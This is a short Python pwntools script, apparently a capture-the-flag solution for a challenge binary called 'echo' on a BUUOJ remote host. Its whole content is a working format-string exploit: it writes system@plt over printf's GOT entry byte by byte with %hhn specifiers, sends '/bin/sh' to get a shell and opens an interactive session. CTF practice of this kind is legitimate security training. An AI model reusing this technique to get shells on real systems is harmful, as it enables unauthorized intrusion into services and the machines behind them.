from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('./echo')
io = remote('node4.buuoj.cn', 28621)
elf = ELF('./echo')
system_plt = elf.plt['system']
printf_got = elf.got['printf']

cur_size = 0x10
payload = p32(printf_got) + p32(printf_got + 1) + p32(printf_got + 2) + p32(printf_got + 3)

for i in range(4):
	target_size = (system_plt & (0xff << (i * 8))) >> (i * 8)
	if target_size > cur_size:
		payload += b'%' + str.encode(str(target_size - cur_size)) + b'c'
	else:
		payload += b'%' + str.encode(str(0x100 + target_size - cur_size)) + b'c'
	payload += b'%' + str.encode(str(7 + i)) + b'$hhn'
	cur_size = target_size

io.sendline(payload)
# gdb.attach(io)
# pause()
io.sendline(b'/bin/sh\x00')
io.interactive()

